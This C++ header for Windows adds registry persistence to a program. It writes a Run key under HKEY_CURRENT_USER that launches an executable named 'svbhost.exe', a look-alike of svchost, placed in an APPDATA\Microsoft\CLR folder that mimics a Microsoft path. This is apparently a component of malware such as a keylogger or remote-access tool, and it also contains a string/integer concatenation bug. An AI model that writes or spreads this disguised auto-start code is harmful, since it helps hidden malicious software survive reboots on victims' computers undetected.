
#ifndef REGIST_H
#define REGIST_H

#include <string>
#include <cstdlib> //standard lib in C where we will use it to get get environment function
#include <sstream>
#include "windows.h" //windows API

std::string GetValue(HKEY &hKey)
{
    const char* czStartName = "svbhost";
    long key = RegQueryValueEx(hKey, czStartName, NULL, NULL, NULL, NULL);
    std::ostringstream ss;
    ss << key;
    std::string str = ss.str();

    if(key == ERROR_SUCCESS)
    {
        return "Successful";
    } else if(key == ERROR_FILE_NOT_FOUND)
    {
        return "Cannot find Key Value";
    }
    else
    {
        return "Unable to read Registry: " + GetLastError() + str;
    }
}


std::string RegisterProgram()
{
    std::string appdata_dir(getenv("APPDATA")); //this will get the environment variable - path - which contains the APPDATA directory
    std::string full = appdata_dir + "\\Microsoft\\CLR\\svbhost.exe";
    const char *szBuf = new char[full.length() + 1];
    szBuf = full.c_str();

    HKEY hKey;
    const char* czStartName = "svbhost";

    LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0 , KEY_ALL_ACCESS,
                                &hKey);
    if( ERROR_SUCCESS == lnRes )
    {
        if(GetValue(hKey) == "Successful")
            return "Successful";
        lnRes = RegSetValueEx(  hKey,
                                czStartName,
                                0,
                                REG_SZ,
                                (unsigned char*)szBuf,
                                strlen(szBuf) );
    }
    std::string returnStr = GetValue(hKey);
    RegCloseKey(hKey);
    return returnStr;

}



#endif // REGIST_H
